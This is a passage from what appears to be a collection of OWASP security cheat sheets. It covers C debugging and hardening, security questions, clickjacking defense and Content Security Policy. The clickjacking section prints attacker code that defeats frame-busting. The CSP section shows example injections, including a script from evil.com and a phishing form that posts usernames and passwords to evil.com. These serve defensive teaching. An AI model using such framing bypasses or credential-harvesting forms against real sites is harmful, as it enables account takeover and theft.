int>::max()));\r\nif(!(t < static_cast<long long>(numeric_limits<unsigned int>::max())))\r\n    throw runtime_error(\"WTF??? Port is too large\");\r\n\r\n// OK to use port\r\nunsigned short port = static_cast<unsigned short>(t);\r\n…\r\n```\r\n\r\nAgain, notice the code above will debug itself - you don't need to set a breakpoint to see if there is a problem with `port`. This code will continue checking conditions, years after being instrumented (assuming to wrote code to read a config file early in the project). There's no need to remove the `ASSERT`s as with `printf` since they are silent guardians.\r\n\r\nAnother useful suppression trick is too avoid ignoring return values. Not only is it useful to suppress the warning, its required for correct code. For example, `snprint` will alert you to truncations through its return value. You should not make them silent truncations by ignoring the warning or casting to `void`:\r\n\r\n```c\r\nchar path[PATH_MAX];\r\n…\r\n\r\nint ret = snprintf(path, sizeof(path), \"%s/%s\", GetDirectory(), GetObjectName());\r\nASSERT(ret != -1);\r\nASSERT(!(ret >= sizeof(path)));\r\n\r\nif(ret == -1 || ret >= sizeof(path))\r\n    throw runtime_error(\"WTF??? Unable to build full object name\");\r\n\r\n// OK to use path\r\n…\r\n```\r\n\r\nThe problem is pandemic, and not just boring user land programs. Projects which offer high integrity code, such as SELinux, suffer silent truncations. The following is from an approved SELinux patch even though a comment was made that it suffered silent truncations in its `security_compute_create_name` function from `compute_create.c`.\r\n\r\n```c\r\n12  int security_compute_create_raw(security_context_t scon,\r\n13                                  security_context_t tcon,\r\n14                                  security_class_t   tclass,\r\n15                                  security_context_t * newcon)\r\n16  {\r\n17    char path[PATH_MAX];\r\n18    char *buf;\r\n19    size_t size;\r\n20    int fd, ret;\r\n21\r\n22    if (!selinux_mnt) {\r\n23      errno = ENOENT;\r\n24      return -1;\r\n25    }\r\n26\r\n27    snprintf(path, sizeof path, \"%s/create\", selinux_mnt);\r\n28    fd = open(path, O_RDWR);\r\n```\r\n\r\nUnlike other examples, the above code will not debug itself, and you will have to set breakpoints and trace calls to determine the point of first failure. (And the code above gambles that the truncated file does not exist or is not under an adversary's control by blindly performing the `open`).\r\n\r\n## Runtime\r\n\r\nThe previous sections concentrated on setting up your project for success. This section will examine additional hints for running with increased diagnostics and defenses. Not all platforms are created equal - GNU Linux is difficult to impossible to [add hardening to a program after compiling and static linking](https://sourceware.org/ml/binutils/2012-03/msg00309.html); while Windows allows post-build hardening through a download. Remember, the goal is to find the point of first failure quickly so you can improve the reliability and security of the code.\r\n\r\n### Xcode\r\n\r\nXcode offers additional [Code Diagnostics](https://developer.apple.com/documentation/code_diagnostics) that can help find memory errors and object use problems. Schemes can be managed through *Products* menu item, *Scheme* submenu item, and then *Edit*. From the editor, navigate to the *Diagnostics* tab. In the figure below, four additional instruments are enabled for the debugging cycle: Scribble guards, Edge guards, Malloc guards, and Zombies.\r\n\r\n[object Promise]\r\n\r\nThere is one caveat with using some of the guards: Apple only provides them for the simulator, and not a device. In the past, the guards were available for both devices and simulators.\r\n\r\n#### Windows\r\n\r\nVisual Studio offers a number of debugging aides for use during development. The aides are called [Managed Debugging Assistants (MDAs)](https://docs.microsoft.com/en-us/dotnet/framework/debug-trace-profile/diagnosing-errors-with-managed-debugging-assistants). You can find the MDAs on the *Debug* menu, then *Exceptions* submenu. MDAs allow you to tune your debugging experience by, for example, filter exceptions for which the debugger should snap. For more details, see Stephen Toub's *[Let The CLR Find Bugs For You With Managed Debugging Assistants](https://docs.microsoft.com/en-us/archive/msdn-magazine/2006/may/let-the-clr-find-bugs-for-you-with-managed-debugging-assistants)*.\r\n\r\n[object Promise]\r\n\r\nFinally, for runtime hardening, Microsoft has a helpful tool called EMET. EMET is the [Enhanced Mitigation Experience Toolkit](https://en.wikipedia.org/wiki/Enhanced_Mitigation_Experience_Toolkit), and allows you to apply runtime hardening to an executable which was built without. Its very useful for utilities and other programs that were built without an SDLC.\r\n\r\n[object Promise]\r\n"
    },
    {
      "Choosing_and_Using_Security_Questions_Cheat_Sheet.md": "# Choosing and Using Security Questions Cheat Sheet\r\n\r\n## Introduction\r\n\r\n**WARNING: Security questions are no longer recognized as an acceptable authentication factor per [NIST SP 800-63](https://pages.nist.gov/800-63-3/sp800-63b.html). Account recovery is just an alternate way to authenticate so it should be no weaker than regular authentication. See [SP 800-63B sec 5.1.1.2 paragraph 4](https://pages.nist.gov/800-63-3/sp800-63b.html#sec5): *Verifiers SHALL NOT prompt subscribers to use specific types of information (e.g., “What was the name of your first pet?”) when choosing memorized secrets*.**\r\n\r\nIf you are curious, please have a look at this [study](https://www.microsoft.com/en-us/research/publication/its-no-secret-measuring-the-security-and-reliability-of-authentication-via-secret-questions/) by Microsoft Research in 2009 and this [study](https://research.google/pubs/pub43783/) performed at Google in 2015. The accompanying [Security blog](https://security.googleblog.com/2015/05/new-research-some-tough-questions-for.html) update includes an infographic on the issues identified with security questions.\r\n\r\n**Please Note:** While there are no acceptable uses of security questions in secure software, this cheat sheet provides guidance on how to choose strong security questions for legacy purposes.\r\n\r\n## Choosing Security Questions\r\n\r\n### Desired Characteristics\r\n\r\nAny security questions presented to users to reset forgotten passwords must meet the following characteristics:\r\n\r\n| Characteristic | Explanation |\r\n|----------------|-------------|\r\n| Memorable | The user must be able to recall the answer to the question, potentially years after creating their account. |\r\n| Consistent | The answer to the question must not change over time. |\r\n| Applicable | The user must be able to answer the question.\r\n| Confidential | The answer to the question must be hard for an attacker to obtain. |\r\n| Specific | The answer should be clear to the user. |\r\n\r\n### Types of Security Questions\r\n\r\nSecurity questions fall into two main types. With *user defined* security questions, the user must choose a question from a list, and provide an answer to the question. Common examples are \"What is your favourite colour?\" or \"What was your first car?\"\r\n\r\nThese are easy for applications to implement, as the additional information required is provided by the user when they first create their account. However, users will often choose weak or easily discovered answers to these questions.\r\n\r\n*System defined* security questions are based on information that is already known about the user. This approach avoids having to ask the user to provide specific security questions and answers, and also prevents them from being able to choose weak details. However it relies on sufficient information already being stored about the user, and on this information being hard for an attacker to obtain.\r\n\r\n### User Defined Security Questions\r\n\r\n#### Bad Questions\r\n\r\nAny questions that do not have all of the characteristics discussed above should be avoided. The table below gives some examples of bad security questions:\r\n\r\n| Question | Problem |\r\n|----------|---------|\r\n| When is your date of birth? | Easy for an attacker to discover. |\r\n| What is your memorable date? | Most users will just enter their birthday. |\r\n| What is your favourite movie? | Likely to change over time. |\r\n| What is your favourite cricket team? | Not applicable to most users. |\r\n| What is the make and model of your first car? | Fairly small range of likely answers. |\r\n\r\nAdditionally, the context of the application must be considered when deciding whether questions are good or bad. For example, a question such as \"What was your maths teacher's surname in your 8th year of school?\" would be very easy to guess if it was using in a virtual learning environment for your school (as other students probably know this information), but would be much stronger for an online gaming website.\r\n\r\n#### Good Questions\r\n\r\nMany good security questions are not applicable to all users, so the best approach is to give the user a list of security questions that they can choose from. This allows you to have more specific questions (with more secure answers), while still providing every user with questions that they can answer.\r\n\r\nThe following list provides some examples of good questions:\r\n\r\n- What is the name of a college you applied to but didn’t attend?\r\n- What was the name of the first school you remember attending?\r\n- Where was the destination of your most memorable school field trip?\r\n- What was your maths teacher's surname in your 8th year of school?\r\n- What was the name of your first stuffed toy?\r\n- What was your driving instructor's first name?\r\n\r\nMuch like passwords, there is a risk that users will re-use recovery questions between different sites, which could expose the users if the other site is compromised. As such, there are benefits to having unique security questions that are unlikely to be shared between sites. An easy way to achieve this is to create more targeted questions based on the type of application. For example, on a share dealing platform, financial related questions such as \"What is the first company you owned shares in?\" could be used.\r\n\r\n#### Allowing Users to Write Their Own Questions\r\n\r\nAllowing users to write their own security questions can result in them choosing very strong and unique questions that would be very hard for an attacker to guess. However, there is also a significant risk that users will choose weak questions. In some cases, users might even set a recovery question to a reminder of what their password is - allowing anyone guessing their email address to compromise their account.\r\n\r\nAs such, it is generally best not to allow users to write their own questions.\r\n\r\n#### Restricting Answers\r\n\r\nEnforcing a minimum length for answers can prevent users from entering strings such as \"a\" or \"123\" for their answers. However, depending on the questions asked, it could also prevent users from being able to correctly answer the question. For example, asking for a first name or surname could result in a two letter answer such as \"Li\", and a colour-based question could be four letters such as \"blue\".\r\n\r\nAnswers should also be checked against a block list, including:\r\n\r\n- The username or email address.\r\n- The user's current password.\r\n- Common strings such as \"123\" or \"password\".\r\n\r\n#### Renewing Security Questions\r\n\r\nIf the security questions are not used as part of the main authentication process, then consider periodically prompting the user to review their security questions and verify that they still know the answers. This should give them a chance to update any answers that may have changed (although ideally this shouldn't happen with good questions), and increases the likelihood that they will remember them if they ever need to recover their account.\r\n\r\n### System Defined Security Questions\r\n\r\nSystem defined security questions are based on information that is already known about the user. The users' personal details are often used, including the full name, address and date of birth. However these can easily be obtained by an attacker from social media, and as such provide a very weak level of authentication.\r\n\r\nThe questions that can be used will vary hugely depending on the application, and how much information is already held about the user. When deciding which bits of information may be usable for security questions, the following areas should be considered:\r\n\r\n- Will the user be able to remember the answer to the question?\r\n- Could an attacker easily obtain this information from social media or other sources?\r\n- Is the answer likely to be the same for a large number of users, or easily guessable?\r\n\r\n## Using Security Questions\r\n\r\n### When to Use Security Questions\r\n\r\nApplications should generally use a password along with a second authentication factor (such as an OTP code) to authenticate users. The combination of a password and security questions **does not constitute MFA**, as both factors as the same (i.e. something you know)..\r\n\r\n**Security questions should never be relied upon as the sole mechanism to authenticate a user**. However, they can provide a useful additional layer of security when other stronger factors are not available. Common cases where they would be used include:\r\n\r\n- Logging in.\r\n- Resetting a forgotten password.\r\n- Resetting a lost MFA token.\r\n\r\n#### Authentication Flow\r\n\r\nSecurity questions may be used as part of the main authentication flow to supplement passwords where MFA is not available. A typical authentication flow would be:\r\n\r\n- The user enters their username and password.\r\n- If the username and password are correct, the user is presented with the security question(s).\r\n- If the answers are correct, the user is logged in.\r\n\r\nIf the answers to the security questions are incorrect, then this should be counted as a failed login attempt, and the account lockout counter should be incremented for the user.\r\n\r\n#### Forgotten Password or Lost MFA Token Flow\r\n\r\nForgotten password functionality often provides a mechanism for attackers to enumerate user accounts if it is not correctly implemented. The following flow avoids this issue by only displaying the security questions once the user has proved ownership of the email address:\r\n\r\n- The user enters email address (and solves a CAPTCHA).\r\n- The application displays a generic message such as \"If the email address was correct, an email will be sent to it\".\r\n- An email with a randomly generated, single-use link is sent to the user.\r\n- The user clicks the link.\r\n- The user is presented with the security question(s).\r\n- If the answer is correct, the user can enter a new password.\r\n\r\n### How to Use Security Questions\r\n\r\n#### Storing Answers\r\n\r\nThe answers to security questions may contain personal information about the user, and may also be re-used by the user between different applications. As such, they should be treated in the same way as passwords, and stored using a secure hashing algorithm such as Bcrypt. The [password storage cheat sheet](Password_Storage_Cheat_Sheet.md) contains further guidance on this.\r\n\r\n#### Comparing Answers\r\n\r\nComparing the answers provided by the user with the stored answer in a case insensitive manner makes it much easier for the user. The simplest way to do this is to convert the answer to lowercase before hashing the answer to store it, and then lowercase the user-provided answer before comparing them.\r\n\r\nIt is also beneficial to give the user some indication of the format that they should use to enter answers. This could be done through input validation, or simply by recommending that the user enters their details in a specific format. For example, when asking for a date, indicating that the format should be \"DD/MM/YYYY\" will mean that the user doesn't have to try and guess what format they entered when registering.\r\n\r\n#### Updating Answers\r\n\r\nWhen the user updates the answers to their security questions, this should be treated as a sensitive operation within the application. As such, the user should be required to re-authenticate themselves by entering their password (or ideally using MFA), in order to prevent an attacker updating the questions if they gain temporary access to the user's account.\r\n\r\n#### Multiple Security Questions\r\n\r\nWhen security questions are used, the user can either be asked a single question, or can be asked multiple questions at the same time. This provides a greater level of assurance, especially if the questions are diverse, as an attacker would need to obtain more information about the target user. A mixture of user-defined and system-defined questions can be very effective for this.\r\n\r\nIf the user is asked a single question out of a bank of possible questions, then this question **should not** be changed until the user has answered it correctly. If the attacker is allowed to try answering all of the different security questions, this greatly increases the chance that they will be able to guess or obtain the answer to one of them.\r\n"
    },
    {
      "Clickjacking_Defense_Cheat_Sheet.md": "# Clickjacking Defense Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis cheat sheet is intended to provide guidance for developers on how to defend against [Clickjacking](https://owasp.org/www-community/attacks/Clickjacking), also known as UI redress attacks.\r\n\r\nThere are three main mechanisms that can be used to defend against these attacks:\r\n\r\n- Preventing the browser from loading the page in frame using the [X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options) or [Content Security Policy (frame-ancestors)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors) HTTP headers.\r\n- Preventing session cookies from being included when the page is loaded in a frame using the [SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite) cookie attribute.\r\n- Implementing JavaScript code in the page to attempt to prevent it being loaded in a frame (known as a \"frame-buster\").\r\n\r\nNote that these mechanisms are all independent of each other, and where possible more than one of them should be implemented in order to provide defense in depth.\r\n\r\n## Defending with Content Security Policy (CSP) frame-ancestors directive\r\n\r\nThe `frame-ancestors` directive can be used in a Content-Security-Policy HTTP response header to indicate whether or not a browser should be allowed to render a page in a `<frame>` or `<iframe>`. Sites can use this to avoid Clickjacking attacks by ensuring that their content is not embedded into other sites.\r\n\r\n`frame-ancestors` allows a site to authorize multiple domains using the normal Content Security Policy semantics.\r\n\r\n### Content-Security-Policy: frame-ancestors Examples\r\n\r\nCommon uses of CSP frame-ancestors:\r\n\r\n- `Content-Security-Policy: frame-ancestors 'none';`\r\n    - This prevents any domain from framing the content. This setting is recommended unless a specific need has been identified for framing.\r\n- `Content-Security-Policy: frame-ancestors 'self';`\r\n    - This only allows the current site to frame the content.\r\n- `Content-Security-Policy: frame-ancestors 'self' *.somesite.com https://myfriend.site.com;`\r\n    - This allows the current site, as well as any page on `somesite.com` (using any protocol), and only the page `myfriend.site.com`, using HTTPS only on the default port (443).\r\n\r\nNote that the single quotes are required around `self` and `none`, but may not occur around other source expressions.\r\n\r\nSee the following documentation for further details and more complex examples:\r\n\r\n- <https://w3c.github.io/webappsec-csp/#directive-frame-ancestors>\r\n- <https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors>\r\n\r\n### Limitations\r\n\r\n- **Browser support:** CSP frame-ancestors is not supported by all the major browsers yet.\r\n- **X-Frame-Options takes priority:** [Section \"Relation to X-Frame-Options\" of the CSP Spec](https://w3c.github.io/webappsec/specs/content-security-policy/#frame-ancestors-and-frame-options) says: \"*If a resource is delivered with an policy that includes a directive named frame-ancestors and whose disposition is \"enforce\", then the X-Frame-Options header MUST be ignored*\", but Chrome 40 & Firefox 35 ignore the frame-ancestors directive and follow the X-Frame-Options header instead.\r\n\r\n### Browser Support\r\n\r\nThe following [browsers](https://caniuse.com/?search=frame-ancestors) support CSP frame-ancestors.\r\n\r\nReferences:\r\n\r\n- [Mozilla Developer Network](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors#browser_compatibility)\r\n\r\n## Defending with X-Frame-Options Response Headers\r\n\r\nThe `X-Frame-Options` HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a `<frame>` or `<iframe>`. Sites can use this to avoid Clickjacking attacks, by ensuring that their content is not embedded into other sites. Set the X-Frame-Options header for all responses containing HTML content. The possible values are \"DENY\", \"SAMEORIGIN\", or \"ALLOW-FROM uri\"\r\n\r\n### X-Frame-Options Header Types\r\n\r\nThere are three possible values for the X-Frame-Options header:\r\n\r\n- **DENY**, which prevents any domain from framing the content. The \"DENY\" setting is recommended unless a specific need has been identified for framing.\r\n- **SAMEORIGIN**, which only allows the current site to frame the content.\r\n- **ALLOW-FROM uri**, which permits the specified 'uri' to frame this page. (e.g., `ALLOW-FROM http://www.example.com`).\r\n    - This is an obsolete directive that no longer works in modern browsers.\r\n    - Check limitations below because this will fail open if the browser does not support it.\r\n    - Other browsers support the new [CSP frame-ancestors directive](https://w3c.github.io/webappsec-csp/#directive-frame-ancestors) instead. A few support both.\r\n\r\n### Browser Support\r\n\r\nThe following [browsers](https://caniuse.com/#search=X-Frame-Options) support X-Frame-Options headers.\r\n\r\nReferences:\r\n\r\n- [Mozilla Developer Network](https://developer.mozilla.org/en-US/docs/web/http/headers/x-frame-options#browser_compatibility)\r\n- [IETF Draft](http://datatracker.ietf.org/doc/draft-ietf-websec-x-frame-options/)\r\n- [X-Frame-Options Compatibility Test](https://erlend.oftedal.no/blog/tools/xframeoptions/) - Check this for the LATEST browser support info for the X-Frame-Options header\r\n\r\n### Implementation\r\n\r\nTo implement this protection, you need to add the `X-Frame-Options` HTTP Response header to any page that you want to protect from being clickjacked via framebusting. One way to do this is to add the HTTP Response Header manually to every page. A possibly simpler way is to implement a filter that automatically adds the header to every page or to add it at Web Application Firewall of Web/Application Server level.\r\n\r\n### Common Defense Mistakes\r\n\r\nMeta-tags that attempt to apply the X-Frame-Options directive DO NOT WORK. For example, `<meta http-equiv=\"X-Frame-Options\" content=\"deny\">` will not work. You must apply the X-FRAME-OPTIONS directive as HTTP Response Header as described above.\r\n\r\n### Limitations\r\n\r\n- **Per-page policy specification**: The policy needs to be specified for every page, which can complicate deployment. Providing the ability to enforce it for the entire site, at login time for instance, could simplify adoption.\r\n- **Problems with multi-domain sites**: The current implementation does not allow the webmaster to provide a list of domains that are allowed to frame the page. While listing allowed domains can be dangerous, in some cases a webmaster might have no choice but to use more than one hostname.\r\n- **ALLOW-FROM browser support**: The ALLOW-FROM option is obsolete and no longer works in modern browsers. BE CAREFUL ABOUT DEPENDING ON ALLOW-FROM. If you apply it and the browser does not support it, then you will have NO clickjacking defense in place.\r\n- **Multiple options not supported**: There is no way to allow the current site and a third-party site to frame the same response. Browsers only honour one X-Frame-Options header and only one value on that header.\r\n- **Nested Frames don't work with SAMEORIGIN and ALLOW-FROM**: In the following situation, the `http://framed.invalid/child` frame does not load because ALLOW-FROM applies to the top-level browsing context, not that of the immediate parent. The solution is to use ALLOW-FROM in both the parent and child frames (but this prevents the child frame loading if the `//framed.invalid/parent` page is loaded as the top level document).\r\n\r\n[object Promise]\r\n\r\n- **X-Frame-Options Deprecated** While the X-Frame-Options header is supported by the major browsers, it has been obsoleted in favour of the frame-ancestors directive from the CSP Level 2 specification.\r\n- **Proxies** Web proxies are notorious for adding and stripping headers. If a web proxy strips the X-Frame-Options header then the site loses its framing protection.\r\n\r\n## Defending with SameSite Cookies\r\n\r\nThe `SameSite` cookie attribute defined in [RFC 6265bis](https://tools.ietf.org/html/draft-ietf-httpbis-rfc6265bis-02#section-5.3.7) is primarily intended to defend against [cross-site request forgery (CSRF)](Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md#samesite-cookie-attribute); however it can also provide protection against Clickjacking attacks.\r\n\r\nCookies with a `SameSite` attribute of either `strict` or `lax` will not be included in requests made to a page within an `<iframe>`. This means that if the session cookies are marked as `SameSite`, any Clickjacking attack that requires the victim to be authenticated will not work, as the cookie will not be sent. An article on the [Netsparker blog](https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/) provides further details on which types of requests cookies are sent for with the different SameSite policies.\r\n\r\nThis approach is discussed on the [JavaScript.info website](https://javascript.info/clickjacking#samesite-cookie-attribute).\r\n\r\n### Limitations\r\n\r\nIf the Clickjacking attack does not require the user to be authenticated, this attribute will not provide any protection.\r\n\r\nAdditionally, while `SameSite` attribute is supported by [most modern browsers](https://caniuse.com/#feat=same-site-cookie-attribute), there are still some users (approximately 6% as of November 2020) with browsers that do not support it.\r\n\r\nThe use of this attribute should be considered as part of a defence-in-depth approach, and it should not be relied upon as the sole protective measure against Clickjacking.\r\n\r\n## Best-for-now Legacy Browser Frame Breaking Script\r\n\r\nOne way to defend against clickjacking is to include a \"frame-breaker\" script in each page that should not be framed. The following methodology will prevent a webpage from being framed even in legacy browsers, that do not support the X-Frame-Options-Header.\r\n\r\nIn the document HEAD element, add the following:\r\n\r\nFirst apply an ID to the style element itself:\r\n\r\n```html\r\n<style id=\"antiClickjack\">\r\n    body{display:none !important;}\r\n</style>\r\n```\r\n\r\nThen, delete that style by its ID immediately after in the script:\r\n\r\n```html\r\n<script type=\"text/javascript\">\r\n    if (self === top) {\r\n        var antiClickjack = document.getElementById(\"antiClickjack\");\r\n        antiClickjack.parentNode.removeChild(antiClickjack);\r\n    } else {\r\n        top.location = self.location;\r\n    }\r\n</script>\r\n```\r\n\r\nThis way, everything can be in the document HEAD and you only need one method/taglib in your API.\r\n\r\n## window.confirm() Protection\r\n\r\nThe use of X-Frame-Options or a frame-breaking script is a more fail-safe method of clickjacking protection. However, in scenarios where content must be frameable, then a `window.confirm()` can be used to help mitigate Clickjacking by informing the user of the action they are about to perform.\r\n\r\nInvoking `window.confirm()` will display a popup that cannot be framed. If the `window.confirm()` originates from within an iframe with a different domain than the parent, then the dialog box will display what domain the `window.confirm()` originated from. In this scenario the browser is displaying the origin of the dialog box to help mitigate Clickjacking attacks. It should be noted that Internet Explorer is the only known browser that does not display the domain that the `window.confirm()` dialog box originated from, to address this issue with Internet Explorer insure that the message within the dialog box contains contextual information about the type of action being performed. For example:\r\n\r\n```html\r\n<script type=\"text/javascript\">\r\n   var action_confirm = window.confirm(\"Are you sure you want to delete your youtube account?\")\r\n   if (action_confirm) {\r\n       //... Perform action\r\n   } else {\r\n       //... The user does not want to perform the requested action.`\r\n   }\r\n</script>\r\n```\r\n\r\n## Insecure Non-Working Scripts DO NOT USE\r\n\r\nConsider the following snippet which is **NOT recommended** for defending against clickjacking:\r\n\r\n```html\r\n<script>if (top!=self) top.location.href=self.location.href</script>\r\n```\r\n\r\nThis simple frame breaking script attempts to prevent the page from being incorporated into a frame or iframe by forcing the parent window to load the current frame's URL. Unfortunately, multiple ways of defeating this type of script have been made public. We outline some here.\r\n\r\n### Double Framing\r\n\r\nSome frame busting techniques navigate to the correct page by assigning a value to `parent.location`. This works well if the victim page is framed by a single page. However, if the attacker encloses the victim in one frame inside another (a double frame), then accessing `parent.location` becomes a security violation in all popular browsers, due to the **descendant frame navigation policy**. This security violation disables the counter-action navigation.\r\n\r\n**Victim frame busting code:**\r\n\r\n```javascript\r\nif(top.location != self.location) {\r\n    parent.location = self.location;\r\n}\r\n```\r\n\r\n**Attacker top frame:**\r\n\r\n```html\r\n<iframe src=\"attacker2.html\">\r\n```\r\n\r\n**Attacker sub-frame:**\r\n\r\n```html\r\n<iframe src=\"http://www.victim.com\">\r\n```\r\n\r\n### The onBeforeUnload Event\r\n\r\nA user can manually cancel any navigation request submitted by a framed page. To exploit this, the framing page registers an `onBeforeUnload` handler which is called whenever the framing page is about to be unloaded due to navigation. The handler function returns a string that becomes part of a prompt displayed to the user.\r\n\r\nSay the attacker wants to frame PayPal. He registers an unload handler function that returns the string \"Do you want to exit PayPal?\". When this string is displayed to the user is likely to cancel the navigation, defeating PayPal's frame busting attempt.\r\n\r\nThe attacker mounts this attack by registering an unload event on the top page using the following code:\r\n\r\n```html\r\n<script>\r\n    window.onbeforeunload = function(){\r\n        return \"Asking the user nicely\";\r\n    }\r\n</script>\r\n\r\n<iframe src=\"http://www.paypal.com\">\r\n```\r\n\r\nPayPal's frame busting code will generate a `BeforeUnload` event activating our function and prompting the user to cancel the navigation event.\r\n\r\n### No-Content Flushing\r\n\r\nWhile the previous attack requires user interaction, the same attack can be done without prompting the user. Most browsers (IE7, IE8, Google Chrome, and Firefox) enable an attacker to automatically cancel the incoming navigation request in an `onBeforeUnload` event handler by repeatedly submitting a navigation request to a site responding with \"*204 - No Content*\".\r\n\r\nNavigating to a No Content site is effectively a NOP, but flushes the request pipeline, thus canceling the original navigation request. Here is sample code to do this:\r\n\r\n```javascript\r\nvar preventbust = 0\r\nwindow.onbeforeunload = function() { killbust++ }\r\nsetInterval( function() {\r\n    if(killbust > 0){\r\n    killbust = 2;\r\n    window.top.location = 'http://nocontent204.com'\r\n    }\r\n}, 1);\r\n```\r\n\r\n```html\r\n<iframe src=\"http://www.victim.com\">\r\n```\r\n\r\n### Exploiting XSS filters\r\n\r\nIE8 and Google Chrome introduced reflective XSS filters that help protect web pages from certain types of XSS attacks. Nava and Lindsay (at Blackhat) observed that these filters can be used to circumvent frame busting code. The IE8 XSS filter compares given request parameters to a set of regular expressions in order to look for obvious attempts at cross-site scripting. Using \"induced false positives\", the filter can be used to disable selected scripts. By matching the beginning of any script tag in the request parameters, the XSS filter will disable all inline scripts within the page, including frame busting scripts. External scripts can also be targeted by matching an external include, effectively disabling all external scripts. Since subsets of the JavaScript loaded is still functional (inline or external) and cookies are still available, this attack is effective for clickjacking.\r\n\r\n**Victim frame busting code:**\r\n\r\n```html\r\n<script>\r\n    if(top != self) {\r\n        top.location = self.location;\r\n    }\r\n</script>\r\n```\r\n\r\n**Attacker:**\r\n\r\n```html\r\n<iframe src=\"http://www.victim.com/?v=<script>if''>\r\n```\r\n\r\nThe XSS filter will match that parameter `<script>if` to the beginning of the frame busting script on the victim and will consequently disable all inline scripts in the victim's page, including the frame busting script. The XSSAuditor filter available for Google Chrome enables the same exploit.\r\n\r\n### Clobbering top.location\r\n\r\nSeveral modern browsers treat the location variable as a special immutable attribute across all contexts. However, this is not the case in IE7 and Safari 4.0.4 where the location variable can be redefined.\r\n\r\n**IE7**: Once the framing page redefines location, any frame busting code in a subframe that tries to read `top.location` will commit a security violation by trying to read a local variable in another domain. Similarly, any attempt to navigate by assigning `top.location` will fail.\r\n\r\n**Victim frame busting code:**\r\n\r\n```javascript\r\nif(top.location != self.location) {\r\n    top.location = self.location;\r\n}\r\n```\r\n\r\n**Attacker:**\r\n\r\n```html\r\n<script>var location = \"clobbered\";</script>\r\n<iframe src=\"http://www.victim.com\"></iframe>\r\n```\r\n\r\n**Safari 4.0.4:**\r\n\r\nWe observed that although location is kept immutable in most circumstances, when a custom location setter is defined via `defineSetter` (through window) the object location becomes undefined.\r\n\r\nThe framing page simply does:\r\n\r\n```html\r\n<script>\r\n    window.defineSetter(\"location\", function(){});\r\n</script>\r\n```\r\n\r\nNow any attempt to read or navigate the top frame's location will fail.\r\n\r\n### Restricted zones\r\n\r\nMost frame busting relies on JavaScript in the framed page to detect framing and bust itself out. If JavaScript is disabled in the context of the subframe, the frame busting code will not run. There are unfortunately several ways of restricting JavaScript in a subframe:\r\n\r\n**In IE 8:**\r\n\r\n```html\r\n<iframe src=\"http://www.victim.com\" security=\"restricted\"></iframe>\r\n```\r\n\r\n**In Chrome:**\r\n\r\n```html\r\n<iframe src=\"http://www.victim.com\" sandbox></iframe>\r\n```\r\n\r\n**Firefox and IE:**\r\n\r\nActivate [designMode](https://developer.mozilla.org/en-US/docs/Web/API/Document/designMode) in parent page.\r\n\r\n```javascript\r\ndocument.designMode = \"on\";\r\n```\r\n"
    },
    {
      "Content_Security_Policy_Cheat_Sheet.md": "# Content Security Policy Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis article brings forth a way to integrate the __defense in depth__ concept to the client-side of web applications. By injecting the Content-Security-Policy (CSP) headers from the server, the browser is aware and capable of protecting the user from dynamic calls that will load content into the page currently being visited.\r\n\r\n## Context\r\n\r\nThe increase in XSS (Cross-Site Scripting), clickjacking, and cross-site leak vulnerabilities demands a more __defense in depth__ security approach.\r\n\r\n### Defense against XSS\r\n\r\nCSP defends against XSS attacks in the following ways:\r\n\r\n#### 1. Restricting Inline Scripts\r\n\r\nBy preventing the page from executing inline scripts, attacks like injecting\r\n\r\n```html\r\n<script>document.body.innerHTML='defaced'</script>\r\n```\r\n\r\n will not work.\r\n\r\n#### 2. Restricting Remote Scripts\r\n\r\nBy preventing the page from loading scripts from arbitrary servers, attacks like injecting\r\n\r\n```html\r\n<script src=\"https://evil.com/hacked.js\"></script>\r\n```\r\n\r\nwill not work.\r\n\r\n#### 3. Restricting Unsafe JavaScript\r\n\r\nBy preventing the page from executing text-to-JavaScript functions like `eval`, the website will be safe from vulnerabilities like the this:\r\n\r\n```js\r\n// A Simple Calculator\r\nvar op1 = getUrlParameter(\"op1\");\r\nvar op2 = getUrlParameter(\"op2\");\r\nvar sum = eval(`${op1} + ${op2}`);\r\nconsole.log(`The sum is: ${sum}`);\r\n```\r\n\r\n#### 4. Restricting Form submissions\r\n\r\nBy restricting where HTML forms on your website can submit their data, injecting phishing forms won't work either.\r\n\r\n```html\r\n<form method=\"POST\" action=\"https://evil.com/collect\">\r\n<h3>Session expired! Please login again.</h3>\r\n<label>Username</label>\r\n<input type=\"text\" name=\"username\"/>\r\n\r\n<label>Password</label>\r\n<input type=\"password\" name=\"pass\"/>\r\n\r\n<input type=\"Submit\" value=\"Login\"/>\r\n</form>\r\n```\r\n\r\n#### 5. Restricting Objects\r\n\r\nAnd by restricting the HTML [object](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object) tag, it also won't be possible for an attacker to inject malicious flash/Java/other legacy executables on the page.\r\n\r\n### Defense against framing attacks\r\n\r\nAttacks like clickjacking and some variants of browser side-channel attacks (xs-leaks) require a malicious website to load the target website in a frame.\r\n\r\nHistorically the `X-Frame-Options` header has been used for this, but it has been obsoleted by the `frame-ancestors` CSP directive.\r\n\r\n### Defense in Depth\r\n\r\nA strong CSP provides an effective **second layer** of protection against various types of vulnerabilities, especially XSS. Although CSP doesn't prevent web applications from *containing* vulnerabilities, it can make those vulnerabilities significantly more difficult for an attacker to exploit.\r\n\r\nEven on a fully static website, which does not accept any user input, a CSP can be used to enforce the use of [Subresource Integrity (SRI)](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity). This can help prevent malicious code from being loaded on the website if one of the third-party sites hosting JavaScript files (such as analytics scripts) is compromised.\r\n\r\nWith all that being said, CSP **should not** be relied upon as the only defensive mechanism against XSS. You must still follow good development practices such as the ones described in [Cross-Site Scripting Prevention Cheat Sheet](Cross_Site_Scripting_Prevention_Cheat_Sheet.md), and then deploy CSP on top of that as a bonus security layer.\r\n\r\n## Policy Delivery\r\n\r\nYou can deliver a Content Security Policy to your website in three ways.\r\n\r\n### 1. 